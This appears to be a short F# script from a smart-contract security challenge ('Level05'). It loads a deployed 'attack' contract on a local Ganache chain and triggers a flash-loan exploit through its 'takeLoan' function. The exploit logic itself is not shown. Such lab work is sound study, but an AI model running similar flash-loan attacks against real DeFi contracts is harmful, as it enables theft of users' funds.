#i """nuget: C:\Users\jon_h\source\repos\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.3" 
#load "./Common.fsx"
#load "./Deployers/DeployLevel05.fsx"

open web3.fs
open Common
open DeployLevel05


// execute flashloan, which will automatically perform deposit and withdraw/payback
let attack = loadDeployedContract devEnvironment2 "0x3838bbf3d309406d3b57b9e0e88e418b29dc8961" GANACHE attackABI |> optimisticallyBindDeployedContract 

txnDevWith2 attack (ByString "takeLoan") [Uint256 "1000000000000000000000000"] ZEROV |> logIt
